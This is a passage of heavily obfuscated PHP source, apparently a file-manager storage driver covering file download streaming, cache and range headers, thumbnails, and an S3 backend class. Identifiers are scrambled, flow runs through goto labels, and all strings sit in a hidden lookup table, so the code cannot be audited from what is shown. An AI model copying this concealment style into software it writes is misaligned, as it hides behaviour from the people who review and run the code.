$D¹“ñ§Ãí¶ = false, $c±¿ºïÙ£ = false, $f¤÷Ï‡ä»ä = '') { goto bª‡™‚ï„; EòÁİèï…İ: $e÷¥¡»„Ü¥ = $this->getType() == $dÍËÊ‡´´é[105]; $bÊª…¬²Õ¥ = $GLOBALS[$dÍËÊ‡´´é[6]][$dÍËÊ‡´´é[87]][$dÍËÊ‡´´é[106]][$dÍËÊ‡´´é[107]]; $cá­×…Œ† = (double) $GLOBALS[$dÍËÊ‡´´é[6]][$dÍËÊ‡´´é[87]][$dÍËÊ‡´´é[106]][$dÍËÊ‡´´é[108]] * 1024 * 1024; goto C£Ë‹®ùæ; CÅ×“ŠÌŒÈ: $a±±ÇÄÏÆ = get_file_mime($dëìÆ¸Ôáß); if (strstr($a±±ÇÄÏÆ, $dÍËÊ‡´´é[116])) { $a±±ÇÄÏÆ = $a±±ÇÄÏÆ . $dÍËÊ‡´´é[117]; } if ($D¹“ñ§Ãí¶ === !1 && !mime_support($a±±ÇÄÏÆ)) { $D¹“ñ§Ãí¶ = !0; $a±±ÇÄÏÆ = $dÍËÊ‡´´é[118]; } goto F¼ëÚ¢è¡ñ; a †‰Û’Şµ: if (isset($_SERVER[$dÍËÊ‡´´é[130]]) && strtotime($_SERVER[$dÍËÊ‡´´é[130]]) == $BŠÔµŠš¢¸[$dÍËÊ‡´´é[83]]) { header($dÍËÊ‡´´é[131], !0, 304); die; } if (isset($_SERVER[$dÍËÊ‡´´é[132]]) && $_SERVER[$dÍËÊ‡´´é[132]] == $f¤÷Ï‡ä»ä) { header($dÍËÊ‡´´é[133] . $f¤÷Ï‡ä»ä, !0, 304); die; } header($dÍËÊ‡´´é[133] . $f¤÷Ï‡ä»ä); goto fÑ¦ª‘îÏ; d¤Æã’ìñ: header($dÍËÊ‡´´é[137] . $AóƒÌ¨©³ì); header($dÍËÊ‡´´é[138]); if (!$D¹“ñ§Ãí¶ && $dëìÆ¸Ôáß == $dÍËÊ‡´´é[139]) { if ($AóƒÌ¨©³ì > 1024 * 1024 * 5) { die; } $d•¤ÚÔ„»å = $this->getContent($FÀ˜êÔÓÚ×); $d•¤ÚÔ„»å = Html::clearSVG($d•¤ÚÔ„»å); header($dÍËÊ‡´´é[140] . strlen($d•¤ÚÔ„»å)); echo $d•¤ÚÔ„»å; die; } goto CäÂ“ñÈåĞ; AÈ—¼Âµ: $BÌå“ Úì¾ = $dÍËÊ‡´´é[115] . $BÌå“ Úì¾ . $dÍËÊ‡´´é[121] . $BÌå“ Úì¾; if ($D¹“ñ§Ãí¶) { header($dÍËÊ‡´´é[122]); header($dÍËÊ‡´´é[123] . $BÌå“ Úì¾); } else { header($dÍËÊ‡´´é[124] . $BÌå“ Úì¾); } header($dÍËÊ‡´´é[125] . gmdate($dÍËÊ‡´´é[109], time() + 3600 * 24 * 30) . $dÍËÊ‡´´é[126]); goto a‡Çà‘œØŞ; bª‡™‚ï„: $dÍËÊ‡´´é =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->cacheMethod(null, null); if (!$FÀ˜êÔÓÚ× || !$this->exist($FÀ˜êÔÓÚ×)) { show_json(LNG($dÍËÊ‡´´é[104]), !1, $c±¿ºïÙ£); } goto EòÁİèï…İ; a‡Çà‘œØŞ: header($dÍËÊ‡´´é[127]); header($dÍËÊ‡´´é[128]); header($dÍËÊ‡´´é[129]); goto a †‰Û’Şµ; BÓ¶ËƒÕÛŸ: if ($_SERVER[$dÍËÊ‡´´é[156]] == $dÍËÊ‡´´é[157]) { return; } $EĞÃ«Ú“¢‚ = 1024 * 100; $EôçêšØ¥… = 0; goto E§Û­æ„²ß; F¼ëÚ¢è¡ñ: header($dÍËÊ‡´´é[119]); header($dÍËÊ‡´´é[120] . $a±±ÇÄÏÆ); $BÌå“ Úì¾ = rawurlencode($fæõµ„ñ‚); goto AÈ—¼Âµ; fÑ¦ª‘îÏ: header($dÍËÊ‡´´é[134] . $Fùùî¢ÒÛŒ . $dÍËÊ‡´´é[126]); header($dÍËÊ‡´´é[135] . $fæõµ„ñ‚); header($dÍËÊ‡´´é[136]); goto d¤Æã’ìñ; C¡¶„Ÿ¤¬ä: $AóƒÌ¨©³ì = $BŠÔµŠš¢¸[$dÍËÊ‡´´é[77]]; $Fùùî¢ÒÛŒ = gmdate($dÍËÊ‡´´é[109], $BŠÔµŠš¢¸[$dÍËÊ‡´´é[83]]); $fæõµ„ñ‚ = $c±¿ºïÙ£ ? $c±¿ºïÙ£ : $this->iconvApp($BŠÔµŠš¢¸[$dÍËÊ‡´´é[28]]); goto BßÖÂëÊçä; cŒÚ„øµÙ¨: $BàÏ«¡×‹– = !0; if ($_SERVER[$dÍËÊ‡´´é[153]] == $dÍËÊ‡´´é[154] && $AóƒÌ¨©³ì > 1204 * 1024 * 1024 * 2) { $BàÏ«¡×‹– = !1; } if ($BàÏ«¡×‹–) { header($dÍËÊ‡´´é[155] . ($fÚ¤‡¼­Ø - $Aº‘¶™Íè + 1)); } goto BÓ¶ËƒÕÛŸ; CäÂ“ñÈåĞ: $BÇ¸Ú‡Á¤š = strtolower($_SERVER[$dÍËÊ‡´´é[141]]); if ($e÷¥¡»„Ü¥ && $BÇ¸Ú‡Á¤š && $bÊª…¬²Õ¥) { if (strstr($BÇ¸Ú‡Á¤š, $dÍËÊ‡´´é[142])) { header($dÍËÊ‡´´é[143] . $FÀ˜êÔÓÚ×); } else { if (strstr($BÇ¸Ú‡Á¤š, $dÍËÊ‡´´é[144])) { header($dÍËÊ‡´´é[145] . $FÀ˜êÔÓÚ×); } else { if (strstr($BÇ¸Ú‡Á¤š, $dÍËÊ‡´´é[146])) { header($dÍËÊ‡´´é[147] . $FÀ˜êÔÓÚ×); } } } if ($cá­×…Œ†) { header($dÍËÊ‡´´é[148] . $cá­×…Œ†); } return; } if (isset($_SERVER[$dÍËÊ‡´´é[149]])) { if (preg_match($dÍËÊ‡´´é[150], $_SERVER[$dÍËÊ‡´´é[149]], $B¯¶‡’¬¹)) { $Aº‘¶™Íè = intval($B¯¶‡’¬¹[1]); if (!empty($B¯¶‡’¬¹[2])) { $fÚ¤‡¼­Ø = intval($B¯¶‡’¬¹[2]); } } header($dÍËÊ‡´´é[151]); header("\x43\157\x6e\164\145\x6e\164\55\x52\x61\156\147\x65\72\x20\142\x79\164\x65\163\x20{$Aº‘¶™Íè}\x2d{$fÚ¤‡¼­Ø}\57" . $AóƒÌ¨©³ì); } else { header($dÍËÊ‡´´é[152]); } goto cŒÚ„øµÙ¨; C£Ë‹®ùæ: @ob_end_clean(); set_timeout(); $BŠÔµŠš¢¸ = $this->infoFull($FÀ˜êÔÓÚ×); goto C¡¶„Ÿ¤¬ä; E§Û­æ„²ß: if ($cá­×…Œ†) { $EôçêšØ¥… = intval(1000 * 1000 * ($EĞÃ«Ú“¢‚ / $cá­×…Œ†)); } while ($Aº‘¶™Íè <= $fÚ¤‡¼­Ø) { $E“Ô¹à‚ë« = timeFloat(); check_abort(); $C»› ø®­‚ = $fÚ¤‡¼­Ø - $Aº‘¶™Íè + 1; if ($C»› ø®­‚ <= $EĞÃ«Ú“¢‚) { $EĞÃ«Ú“¢‚ = $C»› ø®­‚; } echo $this->fileSubstr($FÀ˜êÔÓÚ×, $Aº‘¶™Íè, $EĞÃ«Ú“¢‚); $Aº‘¶™Íè += $EĞÃ«Ú“¢‚; if ($EĞÃ«Ú“¢‚ == $C»› ø®­‚) { $Aº‘¶™Íè = $fÚ¤‡¼­Ø + 1; } if ($EôçêšØ¥…) { $D³ÈãÄ§¦Œ = intval(1000 * 1000 * (timeFloat() - $E“Ô¹à‚ë«)); $c÷ÕĞˆˆŠ  = $EôçêšØ¥… - $D³ÈãÄ§¦Œ; if ($c÷ÕĞˆˆŠ  > 5) { usleep($c÷ÕĞˆˆŠ ); } } } goto EÒó­†Èåñ; BßÖÂëÊçä: $Aº‘¶™Íè = 0; $fÚ¤‡¼­Ø = $AóƒÌ¨©³ì - 1; $dëìÆ¸Ôáß = $this->ext($fæõµ„ñ‚); goto d‰’ Œ©Îó; d‰’ Œ©Îó: if (in_array($dëìÆ¸Ôáß, array($dÍËÊ‡´´é[110], $dÍËÊ‡´´é[111], $dÍËÊ‡´´é[112], $dÍËÊ‡´´é[113]))) { $dëìÆ¸Ôáß = $dÍËÊ‡´´é[114]; } if (!$f¤÷Ï‡ä»ä) { $f¤÷Ï‡ä»ä = md5($Fùùî¢ÒÛŒ . $this->hashSimple($FÀ˜êÔÓÚ×)); } $f¤÷Ï‡ä»ä = $dÍËÊ‡´´é[115] . $f¤÷Ï‡ä»ä . $dÍËÊ‡´´é[115]; goto CÅ×“ŠÌŒÈ; EÒó­†Èåñ: } public function fileOutServer($Bõô£“·î, $e¬¤Ÿ‹‡ÓÆ = false, $bØ’ÈÌôŠÚ = false, $f‚ŠÊÊ»¿Ã = '') { $this->fileOut($Bõô£“·î, $e¬¤Ÿ‹‡ÓÆ, $bØ’ÈÌôŠÚ, $f‚ŠÊÊ»¿Ã); } public function fileOutLink($FÁè†Ù¡¤†) { header($_SERVER[ó¬â¥‰ÊÔ¤Ç£][158] . $FÁè†Ù¡¤†); die; } public function cacheMethod($eÅ•éœ³½—, $EÂéí¤¢È, $Fªô»Ä ç = null) { goto CÔæ°“Ì¸ã; C¸Š„Œ³î: $FïÔåÅÂêƒ = $D¥ç´ƒÎ‹Å[159] . $eÅ•éœ³½— . $D¥ç´ƒÎ‹Å[160] . rtrim($cÀÌÄèÖÁ†, $D¥ç´ƒÎ‹Å[8]); if (is_null($eÅ•éœ³½—)) { $dÜ©˜·åß = array(); return; } if (is_null($EÂéí¤¢È)) { unset($dÜ©˜·åß[$FïÔåÅÂêƒ]); return; } goto Eßßø¬ï©Ê; CÔæ°“Ì¸ã: $D¥ç´ƒÎ‹Å =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; static $dÜ©˜·åß = array(); $cÀÌÄèÖÁ† = $EÂéí¤¢È ? ltrim($this->getPathOuter($EÂéí¤¢È), $D¥ç´ƒÎ‹Å[8]) : $EÂéí¤¢È; goto C¸Š„Œ³î; Eßßø¬ï©Ê: if (!is_null($Fªô»Ä ç)) { $dÜ©˜·åß[$FïÔåÅÂêƒ] = $Fªô»Ä ç; return; } $a‘›¾œ§ = isset($dÜ©˜·åß[$FïÔåÅÂêƒ]) ? $dÜ©˜·åß[$FïÔåÅÂêƒ] : null; if (!is_null($a‘›¾œ§)) { return $a‘›¾œ§; } goto d‘…éì·ÌŸ; d‘…éì·ÌŸ: $a‘›¾œ§ = $this->{$eÅ•éœ³½—}($EÂéí¤¢È); $dÜ©˜·åß[$FïÔåÅÂêƒ] = $a‘›¾œ§; return $a‘›¾œ§; goto b–“øšº®ƒ; b–“øšº®ƒ: } public function fileOutImage($BçÃÂ¤È·Ê, $Cã’©­—ã± = 250) { goto F®¶‡Ÿ¹Ø»; f¸Ó­¢Èğä: IO::fileOut($aÖ›œ‹æĞ¢); goto F²ƒ•”°; C‡Ö˜¨ºÏ¨: $F­˜ÀŒá—Ë = DATA_THUMB . $aÏ¨©‰çÌÂ; del_file($F­˜ÀŒá—Ë); if (!@file_exists($F­˜ÀŒá—Ë)) { $DåŒµÔàˆ = TEMP_FILES; if (!is_dir($DåŒµÔàˆ)) { mk_dir($DåŒµÔàˆ); } $bä»¹—ëÂ¡ = $DåŒµÔàˆ . $d–¦á¶¾× . $f¤æ­ïİï™[94] . $a®©¤«Œ[$f¤æ­ïİï™[167]]; if (!@file_exists($bä»¹—ëÂ¡)) { $bä»¹—ëÂ¡ = $this->download($BçÃÂ¤È·Ê, $bä»¹—ëÂ¡); } $BÃÕôíôŒ = new ImageThumb($bä»¹—ëÂ¡, $f¤æ­ïİï™[173]); $BÃÕôíôŒ->prorate($F­˜ÀŒá—Ë, $Cã’©­—ã±, $Cã’©­—ã± * 10); } goto eà¥ˆã–Ö; eà¥ˆã–Ö: if (!file_exists($F­˜ÀŒá—Ë) || filesize($F­˜ÀŒá—Ë) < 100) { return @file_exists($bä»¹—ëÂ¡) ? IO::fileOut($bä»¹—ëÂ¡) : $this->fileOut($BçÃÂ¤È·Ê); } if (!($aÖ›œ‹æĞ¢ = IO::move($F­˜ÀŒá—Ë, $AËù÷†§˜Ü))) { return IO::fileOut($F­˜ÀŒá—Ë); } del_file($F­˜ÀŒá—Ë); goto f¸Ó­¢Èğä; CŸ¬íÜò¥”: if (!($c‰ãËˆÍŸ£ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $f¤æ­ïİï™[171]))) { $AËù÷†§˜Ü = IO::mkdir(IO_PATH_SYSTEM_TEMP . $f¤æ­ïİï™[172]); } else { $AËù÷†§˜Ü = KodIO::make($c‰ãËˆÍŸ£); } if ($c‰ãËˆÍŸ£ = IO::fileNameExist($AËù÷†§˜Ü, $aÏ¨©‰çÌÂ)) { $F­˜ÀŒá—Ë = KodIO::make($c‰ãËˆÍŸ£); return IO::fileOut($F­˜ÀŒá—Ë, !1, $A¹±Üí†‘Á); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto C‡Ö˜¨ºÏ¨; fİïïÒäÍ: $A¹±Üí†‘Á = $a®©¤«Œ[$f¤æ­ïİï™[28]]; $AêéÔ¤•è‚ = !1; if (isset($GLOBALS[$f¤æ­ïİï™[161]]) && $GLOBALS[$f¤æ­ïİï™[161]][$f¤æ­ïİï™[75]] == $a®©¤«Œ[$f¤æ­ïİï™[75]]) { $b¦ãÁÃÑî = $GLOBALS[$f¤æ­ïİï™[161]][$f¤æ­ïİï™[162]]; if (!$a®©¤«Œ[$f¤æ­ïİï™[163]]) { $a®©¤«Œ[$f¤æ­ïİï™[163]] = $GLOBALS[$f¤æ­ïİï™[161]]; } if (isset($b¦ãÁÃÑî[$f¤æ­ïİï™[164]])) { if ($b¦ãÁÃÑî[$f¤æ­ïİï™[164]] <= $Cã’©­—ã± && $b¦ãÁÃÑî[$f¤æ­ïİï™[165]] <= $Cã’©­—ã±) { $AêéÔ¤•è‚ = !0; } } $A¹±Üí†‘Á = $a®©¤«Œ[$f¤æ­ïİï™[163]][$f¤æ­ïİï™[28]]; } goto d”Û²“¢Ó; d”Û²“¢Ó: if ($a®©¤«Œ[$f¤æ­ïİï™[77]] <= 1024 * 50 || $AêéÔ¤•è‚ || !function_exists($f¤æ­ïİï™[166]) || $a®©¤«Œ[$f¤æ­ïİï™[167]] == $f¤æ­ïİï™[168]) { return $this->fileOut($BçÃÂ¤È·Ê, !1, $A¹±Üí†‘Á); } if (isset($a®©¤«Œ[$f¤æ­ïİï™[163]][$f¤æ­ïİï™[169]])) { $d–¦á¶¾× = $a®©¤«Œ[$f¤æ­ïİï™[163]][$f¤æ­ïİï™[169]]; } else { if (isset($a®©¤«Œ[$f¤æ­ïİï™[163]][$f¤æ­ïİï™[170]])) { $d–¦á¶¾× = $a®©¤«Œ[$f¤æ­ïİï™[163]][$f¤æ­ïİï™[170]]; } else { $d–¦á¶¾× = md5("{$a®©¤«Œ[$f¤æ­ïİï™[28]]}\137{$a®©¤«Œ[$f¤æ­ïİï™[75]]}\137{$a®©¤«Œ[$f¤æ­ïİï™[77]]}"); } } $aÏ¨©‰çÌÂ = "{$d–¦á¶¾×}\x5f{$Cã’©­—ã±}\56\160\156\x67"; goto CŸ¬íÜò¥”; F®¶‡Ÿ¹Ø»: $f¤æ­ïİï™ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (substr($BçÃÂ¤È·Ê, 0, 4) == $f¤æ­ïİï™[146]) { $this->fileOutLink($BçÃÂ¤È·Ê); } $a®©¤«Œ = $this->info($BçÃÂ¤È·Ê); goto fİïïÒäÍ; F²ƒ•”°: } public function fileOutImageServer($dõÔ¢ô¨, $aßÅÍˆÒÀ = 250) { $this->fileOutImage($dõÔ¢ô¨, $aßÅÍˆÒÀ); } public function fileNameAuto($CÄ²¹œ¾¢’, $bÕ¨¡†å, $DÆ˜‘­À’ = REPEAT_RENAME, $dŠÖ‰ÈÀ‡´ = false) { goto EÒ•êØªäÁ; EÒ•êØªäÁ: $D˜îöğïÇ‚ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Fğ•®´‚‚á = $CÄ²¹œ¾¢’ === $D˜îöğïÇ‚[33] ? $bÕ¨¡†å : rtrim($CÄ²¹œ¾¢’, $D˜îöğïÇ‚[8]) . $D˜îöğïÇ‚[8] . $bÕ¨¡†å; if ($DÆ˜‘­À’ == REPEAT_REPLACE || !$this->exist($Fğ•®´‚‚á) || $dŠÖ‰ÈÀ‡´ && $DÆ˜‘­À’ != REPEAT_RENAME_FOLDER) { return $bÕ¨¡†å; } goto fùÁËé‡‰Ô; fùÁËé‡‰Ô: if ($DÆ˜‘­À’ == REPEAT_SKIP) { return !1; } $Cíö¨²•‚  = $D˜îöğïÇ‚[94] . get_path_ext($bÕ¨¡†å); $Cíö¨²•‚  = $Cíö¨²•‚  == $D˜îöğïÇ‚[94] || $dŠÖ‰ÈÀ‡´ ? $D˜îöğïÇ‚[33] : $Cíö¨²•‚ ; goto FåîòÀçƒ; FåîòÀçƒ: $f’‚Ä¤Ã‡ = 1; $BùİîÑƒãì = substr($bÕ¨¡†å, 0, strlen($bÕ¨¡†å) - strlen($Cíö¨²•‚ )); $Cù““½Èì„ = $BùİîÑƒãì . "\50{$f’‚Ä¤Ã‡}\51{$Cíö¨²•‚ }"; goto d´—Œòêğ; d´—Œòêğ: while ($this->exist(rtrim($CÄ²¹œ¾¢’, $D˜îöğïÇ‚[8]) . $D˜îöğïÇ‚[8] . $Cù““½Èì„)) { $Cù““½Èì„ = $BùİîÑƒãì . "\x28{$f’‚Ä¤Ã‡}\x29{$Cíö¨²•‚ }"; $f’‚Ä¤Ã‡++; } return $Cù““½Èì„; goto e„ÃŸòˆÅå; e„ÃŸòˆÅå: } public function listAllFiles($E¯‹ãÂëÀÖ, $Dº«¸å³Âê, $C–¥š½¨ÌĞ = array()) { goto eåŠåø‚È‹; dòòÈÔŠ–µ: foreach (array_unique($aÖ“æˆ£) as $Fõñ¢ÆÂ÷à) { $dˆ…âáò— = array($Bå—Í¯ËÌ[75] => $this->getPathOuter($Bå—Í¯ËÌ[8] . $E¯‹ãÂëÀÖ . $Bå—Í¯ËÌ[8] . $Fõñ¢ÆÂ÷à), $Bå—Í¯ËÌ[76] => 1, $Bå—Í¯ËÌ[77] => 0); if (substr($Fõñ¢ÆÂ÷à, -1) != $Bå—Í¯ËÌ[8]) { $dˆ…âáò—[$Bå—Í¯ËÌ[76]] = 0; $DÁíùÍ­‘‰ = $this->getPath($E¯‹ãÂëÀÖ . $Bå—Í¯ËÌ[8] . $Fõñ¢ÆÂ÷à); $dˆ…âáò—[$Bå—Í¯ËÌ[77]] = isset($C–¥š½¨ÌĞ[$DÁíùÍ­‘‰]) ? $C–¥š½¨ÌĞ[$DÁíùÍ­‘‰] : $this->size($DÁíùÍ­‘‰); } $cŠ–¦ó®Ì[] = $dˆ…âáò—; } return $cŠ–¦ó®Ì; goto BÙ˜¥¤œâ¤; eåŠåø‚È‹: $Bå—Í¯ËÌ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (empty($Dº«¸å³Âê)) { return array(); } $aÖ“æˆ£ = array(); goto FÔ¸ŸÄŞ‘; FÔ¸ŸÄŞ‘: $E¯‹ãÂëÀÖ = trim($E¯‹ãÂëÀÖ, $Bå—Í¯ËÌ[8]); foreach ($Dº«¸å³Âê as $Fõñ¢ÆÂ÷à) { $fôŒ¯ÖĞ¤º = ltrim(substr(trim($Fõñ¢ÆÂ÷à, $Bå—Í¯ËÌ[8]), strlen($E¯‹ãÂëÀÖ)), $Bå—Í¯ËÌ[8]); $aÖ“æˆ£ = array_merge($aÖ“æˆ£, $this->slicePath($fôŒ¯ÖĞ¤º)); } $cŠ–¦ó®Ì = array(); goto dòòÈÔŠ–µ; BÙ˜¥¤œâ¤: } public function slicePath($d…Ó²¸˜ª™) { $DïŞĞğÑó  =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $A–„ô„İ©› = explode($DïŞĞğÑó [8], trim($d…Ó²¸˜ª™, $DïŞĞğÑó [8])); $DÎØˆÂ†Ñî = 0; do { ++$DÎØˆÂ†Ñî; $D•¢œ–ˆŞÒ[] = implode($DïŞĞğÑó [8], array_slice($A–„ô„İ©›, 0, $DÎØˆÂ†Ñî)) . $DïŞĞğÑó [8]; } while ($DÎØˆÂ†Ñî < count($A–„ô„İ©›)); $D•¢œ–ˆŞÒ[count($A–„ô„İ©›) - 1] = $d…Ó²¸˜ª™; return $D•¢œ–ˆŞÒ; } public function getHost() { $cÈ¯÷¼ŞÚÑ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $CˆÛšÅˆèí = parse_url(trim($this->domain, $cÈ¯÷¼ŞÚÑ[8])); $cº»ºõ¶‡„ = isset($CˆÛšÅˆèí[$cÈ¯÷¼ŞÚÑ[174]]) ? $CˆÛšÅˆèí[$cÈ¯÷¼ŞÚÑ[174]] : http_type(); $f•óåÁµ = isset($CˆÛšÅˆèí[$cÈ¯÷¼ŞÚÑ[175]]) ? $CˆÛšÅˆèí[$cÈ¯÷¼ŞÚÑ[175]] : $CˆÛšÅˆèí[$cÈ¯÷¼ŞÚÑ[75]]; if (isset($CˆÛšÅˆèí[$cÈ¯÷¼ŞÚÑ[176]])) { $f•óåÁµ .= $cÈ¯÷¼ŞÚÑ[4] . $CˆÛšÅˆèí[$cÈ¯÷¼ŞÚÑ[176]]; } return $cº»ºõ¶‡„ . $cÈ¯÷¼ŞÚÑ[177] . $f•óåÁµ; } public function pathEncode($E×¡…ÖÉ÷Ã) { $E÷¦ˆÌ¦ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; return str_replace($E÷¦ˆÌ¦[178], $E÷¦ˆÌ¦[8], rawurlencode($E×¡…ÖÉ÷Ã)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($b²Ö‚¹ï½®) { set_timeout(); require_once SDK_DIR . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][179]; parent::__construct(); $this->_init($b²Ö‚¹ï½®); } public function _init($B–‘¼²Ê) { foreach ($B–‘¼²Ê as $Fó¬˜ä™ß => $Aäß¯¥Ğ¦) { if (isset($this->{$Fó¬˜ä™ß})) { $this->{$Fó¬˜ä™ß} = $Aäß¯¥Ğ¦; } } $this->endpoint = $B–‘¼²Ê[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($c±¹Ô¾ê¦ = "\166\64") { $this->signVer = $c±¹Ô¾ê¦; $this->client->setSignatureVersion($c±¹Ô¾ê¦); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto b“È¦Î–‘ç; BáßÍ§øÙ³: $DÀÓ³Å¡¶¼ = array($F­÷ªÍ’íÑ[186], $F­÷ªÍ’íÑ[187], $F­÷ªÍ’íÑ[188], $F­÷ªÍ’íÑ[189], $F­÷ªÍ’íÑ[190]); $CäÑˆ¶Ğê = array_diff($DÀÓ³Å¡¶¼, $D·Ô¬„ ù–); return empty($CäÑˆ¶Ğê); goto Aö‰ˆ£¨„; b“È¦Î–‘ç: $F­÷ªÍ’íÑ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bÄÄÄ¤…´Å = $this->getBucketCors(); if (!$bÄÄÄ¤…´Å || !is_array($bÄÄÄ¤…´Å)) { return !1; } goto bÌõë¢çª³; bÌõë¢çª³: if ($bÄÄÄ¤…´Å[$F­÷ªÍ’íÑ[181]] != $F­÷ªÍ’íÑ[182] || $bÄÄÄ¤…´Å[$F­÷ªÍ’íÑ[183]] != $F­÷ªÍ’íÑ[182]) { return !1; } $D·Ô¬„ ù– = array_map($F­÷ªÍ’íÑ[184], $bÄÄÄ¤…´Å[$F­÷ªÍ’íÑ[185]]); if (!is_array($D·Ô¬„ ù–)) { $D·Ô¬„ ù– = array(); } goto BáßÍ§øÙ³; Aö‰ˆ£¨„: } public function mkfile($Bùëõî¼‘, $EùµÊ­ÚÄ´ = '', $Dïçš¸Ö‘… = REPEAT_RENAME) { $eï‚º‘Çß = $this->setContent($Bùëõî¼‘, $EùµÊ­ÚÄ´); if ($eï‚º‘Çß !== !1) { return $this->getPathOuter($Bùëõî¼‘); } return !1; } public function mkdir($C¡‰‰òà“£, $Fç£Ÿ¾‰ = REPEAT_SKIP) { if (empty($C¡‰‰òà“£)) { return !1; } if ($this->_isFolder($C¡‰‰òà“£)) { return $this->getPathOuter($C¡‰‰òà“£); } $A›ÊÛášø = $this->setContent($C¡‰‰òà“£, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][33], !0); if ($A›ÊÛášø !== !1) { return $this->getPathOuter($C¡‰‰òà“£); } return !1; } public function copyFile($bÒÏÅ¦…ƒÊ, $cŸ¥¥æ¼òŞ, $dñ—¤˜õÌ = array()) { $CÅÒ¾›’Şó =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fá«¸–Š© = $this->objectMeta($bÒÏÅ¦…ƒÊ); if (!$fá«¸–Š©) { return !1; } if ($fá«¸–Š©[$CÅÒ¾›’Şó[77]] <= 1024 * 1024 * 200) { $c¢œÛ˜¢Ù‚ = $this->client->copyObject($this->bucket, $bÒÏÅ¦…ƒÊ, $this->bucket, $cŸ¥¥æ¼òŞ, $CÅÒ¾›’Şó[191], $dñ—¤˜õÌ); } else { $c¢œÛ˜¢Ù‚ = $this->client->multiCopyObject($this->bucket, $bÒÏÅ¦…ƒÊ, $this->bucket, $cŸ¥¥æ¼òŞ, $dñ—¤˜õÌ); } $c¢œÛ˜¢Ù‚ = $c¢œÛ˜¢Ù‚ ? $this->getPathOuter($cŸ¥¥æ¼òŞ) : !1; return $c¢œÛ˜¢Ù‚; } public function moveFile($eÇåßœØŠ”, $CºšàµôŸ) { if ($this->copyFile($eÇåßœØŠ”, $CºšàµôŸ)) { $this->delFile($eÇåßœØŠ”); return $this->getPathOuter($CºšàµôŸ); } return !1; } public function delFile($f±áã¦øÆÂ) { return $this->client->deleteObject($this->bucket, $f±áã¦øÆÂ); } public function delFolder($fçÀ’ËØÉ‚) { goto c§Ê½ÖÆ; açæ¼…Ù®Ø: if (!empty($fçÀ’ËØÉ‚) && !in_array($dÈ’‘ë†¨º, $eÊ‚Ò™ƒí¾[$b¦òë[74]])) { $eÊ‚Ò™ƒí¾[$b¦òë[74]][] = $dÈ’‘ë†¨º; } $FÜª™ô±Ï = $this->delByBatch($eÊ‚Ò™ƒí¾[$b¦òë[73]]); if (!$FÜª™ô±Ï) { return !1; } goto dìƒÊù–´¯; c§Ê½ÖÆ: $b¦òë =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->exist($fçÀ’ËØÉ‚)) { return !0; } $this->listItemCache = !1; goto Bİ¢å‚Èá; Bİ¢å‚Èá: $eÊ‚Ò™ƒí¾ = $this->fileList($fçÀ’ËØÉ‚); $this->listItemCache = !0; $dÈ’‘ë†¨º = trim($fçÀ’ËØÉ‚, $b¦òë[8]) . $b¦òë[8]; goto açæ¼…Ù®Ø; dìƒÊù–´¯: return $this->delByBatch($eÊ‚Ò™ƒí¾[$b¦òë[74]]); goto B¹Ü¬Ñ°ù; B¹Ü¬Ñ°ù: } private function delByBatch($AîšëªŒøİ) { foreach (array_chunk($AîšëªŒøİ, 1000) as $CÅ©‰Ù‹ˆÈ) { $A×ËÙ•ê¤• = $this->client->deleteObjects($this->bucket, $CÅ©‰Ù‹ˆÈ); if (!$A×ËÙ•ê¤•) { return !1; } } return !0; } public function rename($F†œ…ç‹¶î, $CÁ·Åó®Šˆ) { return $this->renameObject($F†œ…ç‹¶î, $CÁ·Åó®Šˆ); } public function listPath($dÈÈí¦ñª, $F½‚ÊªÂÍµ = false) { $eæº…— ”í =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c…Üîê Í¨ = $this->fileList($dÈÈí¦ñª, $eæº…— ”í[8], !0); foreach ($c…Üîê Í¨[$eæº…— ”í[74]] as $e¢Ù•©ÒÏ£ => $cƒÙ¤…Í) { $c…Üîê Í¨[$eæº…— ”í[74]][$e¢Ù•©ÒÏ£] = $this->folderInfo($cƒÙ¤…Í, $F½‚ÊªÂÍµ); } foreach ($c…Üîê Í¨[$eæº…— ”í[73]] as $e¢Ù•©ÒÏ£ => $cƒÙ¤…Í) { $c…Üîê Í¨[$eæº…— ”í[73]][$e¢Ù•©ÒÏ£] = $this->fileInfo($cƒÙ¤…Í[$eæº…— ”í[28]], $F½‚ÊªÂÍµ, $cƒÙ¤…Í); } return $c…Üîê Í¨; } private function fileInfo($fìã“°½Êà, $B‘…àºƒµ¶ = false, $C—ˆÜ¹â¡ğ = array()) { goto b¼ŠË¹¾÷; eÌğ¤ÖŞ†å: if (isset($C—ˆÜ¹â¡ğ[$bÈÌ¨‹ùåœ[195]])) { $Câ–™±ã½¯[$bÈÌ¨‹ùåœ[83]] = $C—ˆÜ¹â¡ğ[$bÈÌ¨‹ùåœ[195]]; } if (isset($C—ˆÜ¹â¡ğ[$bÈÌ¨‹ùåœ[77]])) { $Câ–™±ã½¯[$bÈÌ¨‹ùåœ[77]] = $C—ˆÜ¹â¡ğ[$bÈÌ¨‹ùåœ[77]]; } return $Câ–™±ã½¯; goto Fï¬¢ï­µ‹; b¼ŠË¹¾÷: 